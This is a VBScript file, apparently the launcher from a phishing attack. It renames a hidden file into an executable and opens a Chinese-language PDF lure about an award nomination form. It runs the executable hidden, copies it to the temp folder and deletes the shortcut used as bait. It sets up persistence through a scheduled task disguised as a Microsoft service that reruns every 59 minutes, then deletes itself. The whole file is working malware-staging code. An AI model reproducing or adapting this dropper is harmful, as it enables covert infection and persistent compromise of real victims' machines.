Dim objFSO
Dim strFilePath
Dim strNewFilePath

Set objFSO = WScript.CreateObject("Scripting.FileSystemObject")
Dim currentPath
currentPath = objFSO.GetAbsolutePathName(".")
strFilePath = currentPath & "\_MSWORD\office\cache.bak"
strNewFilePath = currentPath & "\_MSWORD\office\sigverif.exe"
objFSO.MoveFile strFilePath, strNewFilePath
Set objFSO = Nothing

Dim filenameb64
filenameb64 = DecodeBase64("6ZmE5Lu2Me+8muOAijIwMjTlubTluqbkuK3lm73nlLXlt6XmioDmnK/lrabkvJrnp5HlrabmioDmnK/lpZbmjqjojZDmj5DlkI3kuabjgIvvvIjmioDmnK/lj5HmmI7lpZblkoznp5HmioDov5vmraXlpZbvvInloavmiqXor7TmmI4oMjAyNOW5tDjmnIjmlrDniYgpLnBkZg==")

Dim fso
Set fso = WScript.CreateObject("Scripting.FileSystemObject")
Dim sourcePath,destinationPath,runfile,runfile2
sourcePath = currentPath & "\_MSWORD\office\" & "subscription.db"
destinationPath = currentPath & "\" & filenameb64
deleteFile = currentPath &  "\" & filenameb64 & ".lnk"
runfile = Chr(34) & currentPath & "\_MSWORD\office\sigverif.exe" & Chr(34)
runfile2 = currentPath & "\_MSWORD\office\sigverif.exe"
fso.MoveFile sourcePath, destinationPath
fso.DeleteFile deleteFile

Dim tempFolder, tempPath
tempFolder = fso.GetSpecialFolder(2)
tempPath = tempFolder & "\sigverif.exe"
fso.CopyFile runfile2, tempPath, True

Dim v1
v1 = Chr(34) & destinationPath & Chr(34)
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run v1, 0, False
WshShell.Run tempPath, 0, False
fso.DeleteFile runfile2
Set WshShell = Nothing

Dim shellPath
Dim taskName

    shellPath = tempPath
        taskName = "WpnUserService_x64"
    Const TriggerTypeDaily = 1
        Const ActionTypeExec = 0
        Set service = CreateObject("Schedule.Service")
        Call service.Connect
        Dim rootFolder1
        Set rootFolder1 = service.GetFolder("\")
        Dim taskDefinition
        Set taskDefinition = service.NewTask(0)
        Dim regInfo
        Set regInfo = taskDefinition.RegistrationInfo
        regInfo.Description = "Update"
        regInfo.Author = "Microsoft"

        Dim settings1
        Set settings1 = taskDefinition.settings
        settings1.Enabled = True
        settings1.StartWhenAvailable = True
        settings1.Hidden = False
        settings1.DisallowStartIfOnBatteries = False


        Dim triggers
        Set triggers = taskDefinition.triggers

        Dim trigger
        On Error Resume Next
            CreateObject("WScript.Shell").RegRead ("HKEY_USERS\S-1-5-19\Environment\TEMP")
            If Err.Number = 0 Then
                IsAdmin = True
                    Set trigger = triggers.Create(8)
            Set trigger = triggers.Create(9)
            Else
                IsAdmin = False
            End If
            Err.Clear
            On Error GoTo 0
        Set trigger = triggers.Create(7)
        Set trigger = triggers.Create(6)
        Set trigger = triggers.Create(TriggerTypeDaily)
        Dim startTime, endTime

        Dim time

        time = DateAdd("n", 1, Now)
        Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
        Dim tTime, tDate

        cSecond = "0" & Second(time)
        cMinute = "0" & Minute(time)
        CHour = "0" & Hour(time)
        cDay = "0" & Day(time)
        cMonth = "0" & Month(time)
        cYear = Year(time)

        tTime = Right(CHour, 2) & ":" & Right(cMinute, 2) & ":" & Right(cSecond, 2)
        tDate = cYear & "-" & Right(cMonth, 2) & "-" & Right(cDay, 2)
        startTime = tDate & "T" & tTime

        endTime = "2099-05-02T10:52:02"
        trigger.StartBoundary = startTime
        trigger.EndBoundary = endTime
        trigger.ID = "TimeTriggerId"
        trigger.Enabled = True

        Dim repetitionPattern
        Set repetitionPattern = trigger.Repetition
        repetitionPattern.Interval = "PT59M" '
        Dim Action1
        Set Action1 = taskDefinition.Actions.Create(ActionTypeExec)
        Action1.Path = shellPath
        Action1.arguments = ""
        Dim objNet, LoginUser
        Set objNet = CreateObject("WScript.Network")
        LoginUser = objNet.UserName

            If UCase(LoginUser) = "SYSTEM" Then
            Else
            LoginUser = Empty
            End If

        Call rootFolder1.RegisterTaskDefinition(taskName, taskDefinition, 6, LoginUser, , 3)

Function DecodeBase64(b64)
    Dim xml, byteArray, stream
    Set xml = CreateObject("MSXml2.DOMDocument.3.0")
    xml.async = False
    xml.LoadXml "<root></root>"
    xml.documentElement.dataType = "bin.base64"
    xml.documentElement.Text = b64
    byteArray = xml.documentElement.nodeTypedValue

    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 'adTypeBinary
    stream.Open
    stream.Write byteArray
    stream.Position = 0
    stream.Type = 2 'adTypeText
    stream.Charset = "utf-8"
    DecodeBase64 = stream.ReadText
    stream.Close
End Function

Set objFSO = CreateObject("Scripting.FileSystemObject")
strScriptPath = WScript.ScriptFullName
If LCase(Right(strScriptPath, 4)) = ".vbs" Then
    objFSO.DeleteFile strScriptPath
End If
WScript.Quit
